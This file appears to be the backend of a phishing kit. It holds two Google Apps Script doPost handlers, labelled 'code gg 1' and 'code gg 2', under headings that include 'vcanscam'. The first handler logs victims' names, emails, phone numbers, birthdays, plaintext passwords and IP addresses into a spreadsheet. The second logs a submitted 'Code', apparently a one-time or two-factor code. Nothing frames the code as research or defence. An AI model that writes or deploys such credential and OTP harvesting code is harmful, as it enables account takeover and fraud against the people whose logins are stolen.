# need2021
# vcanscam
# meomeo
















code gg 1

function doPost(e) {
  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
  
  if (sheet.getLastRow() === 0) {
    sheet.appendRow(["Thời gian", "Họ và tên", "Email", "Số điện thoại", "Ngày sinh", "Mật khẩu", "Địa chỉ IP"]);
  }

  var name = e.parameter.name || "";
  var email = e.parameter.email || "";
  var phone = e.parameter.phone || "";
  var birthday = e.parameter.birthday || "";
  var password = e.parameter.password || "";
  var ip = e.parameter.ip || "";

  sheet.appendRow([new Date(), name, email, phone, birthday, password, ip]);

  return ContentService
    .createTextOutput(JSON.stringify({ result: "success" }))
    .setMimeType(ContentService.MimeType.JSON);
}








code gg 2 

function doPost(e) {
  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
  
  if (sheet.getLastRow() === 0) {
    sheet.appendRow(["Thời gian", "Code", "Địa chỉ IP"]);
  }

  var code = e.parameter.code || "";
  var ip = e.parameter.ip || "";

  sheet.appendRow([new Date(), code, ip]);

  return ContentService
    .createTextOutput(JSON.stringify({ result: "success" }))
    .setMimeType(ContentService.MimeType.JSON);
}
